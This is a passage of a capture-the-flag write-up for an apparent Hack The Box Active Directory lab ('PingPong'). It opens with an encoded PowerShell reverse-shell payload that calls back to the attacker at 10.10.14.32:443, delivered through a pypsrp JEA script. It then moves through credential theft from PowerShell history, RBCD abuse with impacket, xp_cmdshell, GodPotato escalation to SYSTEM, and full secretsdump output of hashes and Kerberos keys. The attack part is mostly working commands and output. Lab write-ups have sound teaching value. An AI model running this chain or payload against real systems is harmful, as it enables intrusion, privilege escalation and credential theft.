JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

The encoded payload is wrapped into a pypsrp script that authenticates as `Pong_gMSA$` and opens a runspace against the `restricted` session configuration — the critical difference from a normal PSRP connection.

```python
import os
from pypsrp.wsman import WSMan
from pypsrp.powershell import RunspacePool, PowerShell

os.environ["KRB5CCNAME"] = "Pong_gMSA$.ccache"
os.environ["KRB5_CONFIG"] = "./krb5.conf"

cmd = r'& { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= }'

ws = WSMan("dc1.ping.htb", port=5985, ssl=False, path="wsman", auth="kerberos", encryption="auto", no_proxy=True, negotiate_service="HTTP")

with RunspacePool(ws, configuration_name="restricted") as pool:
    ps = PowerShell(pool)
    ps.add_script(cmd)
    for i in ps.invoke():
        print(i)
    for e in ps.streams.error:
        print(e)
```

By setting `configuration_name="restricted"`, PowerShell loads the exact session profile defined in `JEA.pssc`, running our command in the context `Pong_gMSA$` is actually authorized to use. With a listener ready, the connection comes back:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nc -lnvp 443                                            
listening on [any] 443 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.245.56] 60449

PS C:\Users\Pong_gMSA$\Documents> 
```

# Phase 10 — Lateral Movement to C.Carlssen

## PowerShell History Findings

Local enumeration from this shell doesn't turn up much at first. The Documents directory contains only configuration artifacts:

```shell
PS C:\Users\Pong_gMSA$\Documents> dir


    Directory: C:\Users\Pong_gMSA$\Documents


Mode                 LastWriteTime         Length Name                                             
----                 -------------         ------ ----                                             
-a----         1/30/2026   9:09 AM           1215 ITAccess.psrc                                    
-a----         1/20/2026   8:04 AM           1004 JEAconfig_backup.pssc
```

Checking group memberships and privileges shows nothing immediately privileged either:

```powershell
PS C:\Users\Pong_gMSA$\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes                                        
=========================================== ================ ============================================= ==================================================
pong\Domain Computers                       Group            S-1-5-21-2410575906-3092493790-2123333151-515 Mandatory group, Enabled by default, Enabled group
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
```

```powershell
PS C:\Users\Pong_gMSA$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Neither the filesystem nor the account's rights offer an obvious escalation path, so I turned to PowerShell's command history. The `PSReadLine` module persists a per-user history file at:

```text
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

For `Pong_gMSA$`, the full path is:

```text
C:\Users\Pong_gMSA$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
PS C:\Users\Pong_gMSA$\Documents> Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
ls
ls -force
hostname
whoami
whoami /all
Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Get-Help Get-Process
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
gci
gci C:\
Getchilditem \Windows
Set-Location C:\Users\
ls
cd.\Public
ls
cd C:\
gic -Recurse -ErrorAction SilentlyContinue
gci -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Filter *.log
Get-ChildItem -Recurse -Include *.txt
Clear-Host
Get-Command
Get-Command *service*
Get-Command *process*
Get-CimInstance Win32_OperatingSystem
Get-CimInstance Win32_ComputerSystem
Get-CimInstance Win32_Process
Get-CimInstance Win32_LogicalDisk
Get-CimInstance Win32_BIOS
Get-Alias
Get-History
ipconfig
ipconfig /all
ping google.com
netstat -ano
Test-NetConnection google.com
Test-NetConnection google.com -Port 443
Get-DnsClientServerAddress
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
tasklist
tasklist /v
ls
ls -force
Get-Process explorer
Get-EventLog -LogName System -Newest 20
Get-EventLog -LogName Application -Newest 20
Get-WinEvent -LogName Security -MaxEvents 10
Clear-EventLog -LogName Application
$env:Path
Get-PSDrive
Get-PSProvider
Get-
Get-Module -ListAvailable
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter *
Get-ADUser -Identity Administrator
Get-ADGroup -Filter * -Server pong.htb
Getadgroup
Get-adgroup "remote management users" -server pong.htb
$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
Get-ADComputer -Filter *
Get-ADUser -Filter * | Select-Object Name
Get-ADUser -Filter * | Export-Csv users.csv -NoTypeInformation
Import-Csv users.csv
gc -raw users.csv
cd C:\Temp
Copy-Item users.csv backup_users.csv
Move-Item backup_users.csv archive_users.csv
rm -f *.csv
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"
Restart-Service spooler
Stop-Service spooler
Start-Service spooler
Set-Service spooler -StartupType Automatic
Get-Service spooler
Get-Process powershell
Get-Process pwsh
$PSVersionTable
Get-Host
Clear-History
Get-History
Measure-Command { Get-Process }
ForEach ($i in 1..10) { Write-Output $i }
1..10 | ForEach-Object { $_ * 2 }
1..10 | Where-Object { $_ -gt 5 }
$numbers = 1..100
$numbers | Measure-Object -Sum
$numbers | Measure-Object -Average
$numbers | Sort-Object -Descending
$numbers | Select-Object -First 10
Get-ChildItem HKLM:\Software
Get-ChildItem HKCU:\Software
Get-Command -Module Microsoft.PowerShell.Management
Save-Help -DestinationPath C:\Help
Get-PSReadLineOption
Set-PSReadLineOption -PredictionSource History
Clear-Host
iwr -useb https://github.com/fleschutz/PowerShell/blob/main/scripts/play-mission-impossible.ps1

Exit
```

Most of this is routine administrative noise — AD queries, service checks, scheduled task inspection. One line, however, is a genuine credential leak:

```powershell
$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
```

This constructs a PowerShell credential object for `pong\c.carlssen` with the password embedded in plaintext. `PSReadLine` history is a classic — and frequently overlooked — place for administrators to accidentally leave working credentials behind.

## Authenticating as C.Carlssen

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDS0kN40BqXSUbq7aBf4c%252FScreenshot%2520%283202%29.png%3Falt%3Dmedia%26token%3D06f26d1b-d0f2-4400-bf45-ad6402e3ce4b&width=768&dpr=3&quality=100&sign=cced7eb9809d51c89ab1f29274ac9ce1&sv=3)

Back in BloodHound, the **IT Service Admins@PONG.HTB** group contains three accounts: `C.Carlssen`, `P.Sanchez`, and `R.Rupert`. `C.Carlssen` stands out because it's also a member of **Remote Management** — meaning our newly recovered password gives us actual interactive access, not just group membership on paper.

We request a TGT for `c.carlssen` using the recovered password.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ impacket-getTGT 'PONG.HTB/c.carlssen:A()DUJ!@414'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.carlssen.ccache
```

And use it to open a WinRM session against DC2.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ evil-winrm -i dc2.pong.htb -r PONG.HTB

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\C.Carlssen\Documents>
```

The session establishes cleanly, confirming both the credential and its Remote Management membership. From here, grabbing the user flag is straightforward:

```shell
*Evil-WinRM* PS C:\Users\C.Carlssen\Desktop> cat user.txt
[REDACTED]
```

# Phase 11 — Resource-Based Constrained Delegation Abuse

## Identifying the SQL Admin Path

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Ff9qO22mkOmr1KqGMNqlt%252FScreenshot%2520%283203%29.png%3Falt%3Dmedia%26token%3D656b2bcc-8c33-4863-bc88-5fccc48cca1f&width=768&dpr=3&quality=100&sign=0cd7e2696591f152708dda4800761d8d&sv=3)

BloodHound shows `IT Service Admins@PONG.HTB` holds `GenericWrite` over three service accounts — `svc_ldap`, `svc_print`, and `svc_sql`. Since `C.Carlssen` inherits this from group membership, we can modify attributes on any of these accounts, which is a common entry point for Kerberoasting, shadow-credential attacks, or (as here) delegation abuse.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FwhFGwOpVscd4lYjqF5xg%252FScreenshot%2520%283204%29.png%3Falt%3Dmedia%26token%3D995722ef-b7bd-413d-b7fd-7c5c2b149f58&width=768&dpr=3&quality=100&sign=de802650eb9a46dbdc8744890042c1a6&sv=3)

More specifically, `svc_sql` holds **SQLAdmin** rights on DC2 — it's the only account with SQL admin execution privileges there, making it the obvious target.

Normally, abusing `GenericWrite` for delegation means creating a new computer account and configuring RBCD against it. Here, though, `MachineAccountQuota` is set to `0`, which blocks new computer-account creation entirely. Fortunately, we don't need a new account — we already control `Pong_gMSA$`, which can serve the same purpose.

## Configuring RBCD on svc_sql

**Resource-Based Constrained Delegation (RBCD)** lets an account (or computer) specify, via its own security descriptor, which other principals are allowed to impersonate users when accessing it. Unlike classic constrained delegation, this doesn't require any special right on the delegating account itself — you just need write access to the *target's* `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which `GenericWrite` provides.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ bloodyAD -d pong.htb --host dc2.pong.htb --dc-ip 192.168.2.2 -u c.carlssen -k ccache=c.carlssen.ccache add rbcd svc_sql 'Pong_gMSA$'                                     
[!] No security descriptor has been returned, a new one will be created
[+] Pong_gMSA$ can now impersonate users on svc_sql via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+ccache://pong.htb\c.carlssen:c.carlssen.ccache@dc2.pong.htb/?serverip=192.168.2.2&dc=192.168.2.2' 'HOST/svc_sql@pong.htb' 'Administrator@pong.htb'
```

`Pong_gMSA$` is now authorized to perform **S4U2Proxy** requests on behalf of arbitrary users against `svc_sql`'s services — meaning it can request a service ticket *as if* it were any user it chooses, for any SPN hosted by that account.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fjzd7S5JEH8IBsHSdZNEB%252FScreenshot%2520%283205%29.png%3Falt%3Dmedia%26token%3Dc0038219-29da-46ab-9ae4-e0b7ac257419&width=768&dpr=3&quality=100&sign=eb0c2be085600afd356efff961fd40cb&sv=3)

BloodHound shows `P.Reiner` and `C.Adam` both belong to `Database Admins@PONG.HTB`, confirming they hold administrative rights on the SQL side of DC2 — either would make a good impersonation target.

## Impersonating C.Adam

We chain **S4U2Self** (request a ticket to ourselves on behalf of `c.adam`) and **S4U2Proxy** (exchange that for a ticket to the target SPN) in a single `impacket-getST` call.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ KRB5CCNAME='Pong_gMSA$.ccache' impacket-getST -k -no-pass -spn 'mssqlsvc/dc2.pong.htb' -impersonate 'c.adam' -dc-ip 192.168.2.2 'pong.htb/Pong_gMSA$'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating c.adam
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
```

Both steps succeed, giving us a service ticket that represents `c.adam` for the MSSQL SPN — without ever knowing `c.adam`'s password. We use it to authenticate to SQL Server directly.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ KRB5CCNAME='c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache' impacket-mssqlclient -k -no-pass 'pong.htb/c.adam@dc2.pong.htb' -dc-ip 192.168.2.2                      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\C.Adam  dbo@master)>
```

# Phase 12 — MSSQL Command Execution and Privilege Escalation

## Enabling xp_cmdshell

With a working SQL session as `C.Adam`, the next step is enabling `xp_cmdshell`, the SQL Server extended stored procedure that runs arbitrary OS commands through the SQL service account.

```powershell
SQL (pong\C.Adam  dbo@master)> enable_xp_cmdshell
INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

We check what privileges this execution context actually carries:

```powershell
SQL (pong\C.Adam  dbo@master)> EXEC xp_cmdshell 'whoami /priv'
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL    
```

## Escalating to SYSTEM with GodPotato

`SeImpersonatePrivilege` is the key privilege here — it allows a process to impersonate the security token of any client that connects to it, which is exactly the primitive behind the well-known family of "Potato" privilege-escalation exploits. Because the SQL Server service typically runs with this privilege enabled by default, and because Windows COM/DCOM activation can be coerced into authenticating as SYSTEM to a listener we control, tools like **GodPotato** can trick the system into handing us a SYSTEM-level token.

We upload the exploit binary through the existing Evil-WinRM session:

```powershell
*Evil-WinRM* PS C:\Temp> upload GodPotato-NET4.exe
                                        
Info: Uploading /home/kuroshiro/HTB/PingPong/GodPotato-NET4.exe to C:\Temp\GodPotato-NET4.exe
                                        
Data: 76456 bytes of 76456 bytes copied
                                        
Info: Upload successful!
```

Then grant execute permissions so the SQL service account can run it:

```powershell
*Evil-WinRM* PS C:\Temp> icacls C:\Temp\GodPotato-NET4.exe  /grant Everyone:RX
processed file: C:\Temp\GodPotato-NET4.exe
Successfully processed 1 files; Failed processing 0 files
```

We launch GodPotato through `xp_cmdshell`, using its SYSTEM-level impersonation to add `pong\c.carlssen` to the local Administrators group.

```powershell
SQL (pong\C.Adam  dbo@master)> EXEC xp_cmdshell 'C:\Temp\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators pong\c.carlssen /add"'
output                                                                                   
--------------------------------------------------------------------------------------   
[*] CombaseModule: 0x140735316885504                                                     
[*] DispatchTable: 0x140735319472456                                                     
[*] UseProtseqFunction: 0x140735318765088                                                
[*] UseProtseqFunctionParamCount: 6                                                      
[*] HookRPC                                                                              
[*] Start PipeServer                                                                     
[*] CreateNamedPipe \\.\pipe\a586b7ce-e27d-4f18-b481-1f6301d6754d\pipe\epmapper          
[*] Trigger RPCSS                                                                        
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                  
[*] DCOM obj IPID: 00008802-0174-ffff-fe02-03ce6138d5e4                                  
[*] DCOM obj OXID: 0x57cd7cdd9d336481                                                    
[*] DCOM obj OID: 0xfc3e028d1720f73c                                                     
[*] DCOM obj Flags: 0x281                                                                
[*] DCOM obj PublicRefs: 0x0                                                             
[*] Marshal Object bytes len: 100                                                        
[*] UnMarshal Object                                                                     
[*] Pipe Connected!                                                                      
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                            
[*] CurrentsImpersonationLevel: Impersonation                                            
[*] Start Search System Token                                                            
[*] PID : 888 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True                                                             
[*] UnmarshalObject: 0x80070776                                                          
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                     
[*] process start with pid 3920                                                          
The command completed successfully.                                                      
NULL                                                                                     
NULL
```

GodPotato successfully locates and impersonates a SYSTEM token, and the command to add `c.carlssen` to Administrators completes. We confirm the new membership from the existing Evil-WinRM session:

```shell
*Evil-WinRM* PS C:\Users\C.Carlssen\Documents> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
C.Carlssen
Domain Admins
Enterprise Admins
The command completed successfully.
```

## Dumping Domain Secrets from DC2

`c.carlssen` is now effectively a Domain Admin equivalent for `pong.htb`. We use that access to dump every secret DC2 holds with `impacket-secretsdump`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ KRB5CCNAME=c.carlssen.ccache impacket-secretsdump -k -no-pass 'pong.htb/c.carlssen@dc2.pong.htb' -dc-ip 192.168.2.2 -target-ip 192.168.2.2 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xdee71f7ea0e118519be7765b9db41a65
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a24454d98e39a4a6d022b5d3e64c9e71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
pong\DC2$:plain_password_hex:64349515ca8aa48c1bda29023b423f5a8f46f50e2f28b37107f445781b64697dedd29b93a3b87e4acd6c624f9007a491512fce15fe7a59aacaea270c93c5c428464f0f730aebcc66bbadb36a93afa8cb82656e5ac1ab01d69bcccb030934f774bd0131135528f790883abfd3d00588a8600fd24cd722c0a4bc47ba43236d430caf04de2fc8410943e18a9a082df054429bf31043d6f69387bc43a855e3e550950054967cba3895bb36794c52aa78d2aa7e04e6e4c8adea63bd5b23146f055792c5bc3aa444abd35f2df404fff90989cfcc7fbc68f7f12174f77b454cbec13f206608970f5737350ff2ebf0acc8f440a8
pong\DC2$:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3fc94174d83a1bc9db957259e29130a9e19ccbef
dpapi_userkey:0xaa394100f064e1d1a6e0ad4366e0ea391358ba52
[*] NL$KM 
 0000   04 44 D9 97 85 D7 4A 1F  C5 A3 4E 26 3C 19 05 D1   .D....J...N&<...
 0010   D9 A3 20 EA 3A B3 AA A2  AC B1 30 76 BE 34 25 11   .. .:.....0v.4%.
 0020   27 03 89 80 C7 2C C3 FF  36 71 63 EA 9C ED 92 C7   '....,..6qc.....
 0030   8C 3B 31 75 38 96 2B 6E  D9 DB 61 30 D9 11 B3 63   .;1u8.+n..a0...c
NL$KM:0444d99785d74a1fc5a34e263c1905d1d9a320ea3ab3aaa2acb13076be34251127038980c72cc3ff367163ea9ced92c78c3b317538962b6ed9db6130d911b363
[*] _SC_MSSQLSERVER 
PONG\svc_sql:This!IsAServi@ceA1231ccount
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b8ebfb6e9972babf9c01311748261a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2850c6e9dfa66b220c3e013edbb23580:::
C.Carlssen:1110:aad3b435b51404eeaad3b435b51404ee:e15edce7e905644a94f0c34a0b05104e:::
M.Sun:1111:aad3b435b51404eeaad3b435b51404ee:deccbc15ace5cbf2d902f441783f1115:::
Z.Zhen:1112:aad3b435b51404eeaad3b435b51404ee:df023cb090b82c55e3e18e5fbc7f9bc3:::
A.Pearson:1113:aad3b435b51404eeaad3b435b51404ee:9a9250fa13ba7f4c25e1a5576f5b8a03:::
P.Sanchez:1114:aad3b435b51404eeaad3b435b51404ee:5261d93d06680fc00db5454eff3bcfc0:::
H.Gordon:1115:aad3b435b51404eeaad3b435b51404ee:2dc83c2f510d420be2bf3692e9cb7371:::
P.Reiner:1116:aad3b435b51404eeaad3b435b51404ee:6fa016af828999bda0e26861e00afb31:::
C.Adam:1117:aad3b435b51404eeaad3b435b51404ee:3dbc49f649cd0ed23ecd7d5071bcf00b:::
R.Rupert:1118:aad3b435b51404eeaad3b435b51404ee:8960e808108c23470cea0551d0399e8f:::
svc_sql:1119:aad3b435b51404eeaad3b435b51404ee:9e5de13bde362ad5cc68a49d26301c3b:::
svc_print:1120:aad3b435b51404eeaad3b435b51404ee:e21d90eb3c651f4bfdf6606a4c07ffd5:::
svc_ldap:1121:aad3b435b51404eeaad3b435b51404ee:f49491f9d40172069146a9c907e4d510:::
R.Martinelli:1124:aad3b435b51404eeaad3b435b51404ee:d60fc26a0569b953a5cebd1392232630:::
DC2$:1000:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
Pong_gMSA$:1123:aad3b435b51404eeaad3b435b51404ee:9c3ee1ce05c0420598749668bda69074:::
PING$:1103:aad3b435b51404eeaad3b435b51404ee:0c6dd1ddf3d7cca07f8386f84f3b63a0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:eb76ed05ee09e812ac2b1328f5b846afeafe69f9a1ba13f94f50ab3d8d524559
Administrator:aes128-cts-hmac-sha1-96:3ca116fdd0d280d751be4efee3eeea7b
Administrator:des-cbc-md5:25ab7c5498ef6df1
krbtgt:aes256-cts-hmac-sha1-96:6282e2af4ca8f5ca935f84d03b486f2e6cc2a9b5c87fb0637a4449a44a8cd5f8
krbtgt:aes128-cts-hmac-sha1-96:f1dc39ca727289c857163fb606b5aa41
krbtgt:des-cbc-md5:6702c7679d2949ef
C.Carlssen:aes256-cts-hmac-sha1-96:1fc4a69c646ad7fe6537eedf7d08e55c93143cf4dd32ec1d27fcd9d007cb78ba
C.Carlssen:aes128-cts-hmac-sha1-96:69ba981c227f43ae62ce4ce3f60389f4
C.Carlssen:des-cbc-md5:648c5e25761973c7
M.Sun:aes256-cts-hmac-sha1-96:653c8cb750f25f9d74c0477616e542d5430cf6bee994b50161cf5d52f3bedfd0
M.Sun:aes128-cts-hmac-sha1-96:8f07ec02fc56a32150d23fd0dbc353a3
M.Sun:des-cbc-md5:105ea16e20762aa2
Z.Zhen:aes256-cts-hmac-sha1-96:208f13a06970095f1edd7942478afd6d34f3b3ccddcae627fdfc00c1b22502b8
Z.Zhen:aes128-cts-hmac-sha1-96:b89193e73905053e95fb2ad3b340cfdb
Z.Zhen:des-cbc-md5:1c8a257962dccdb5
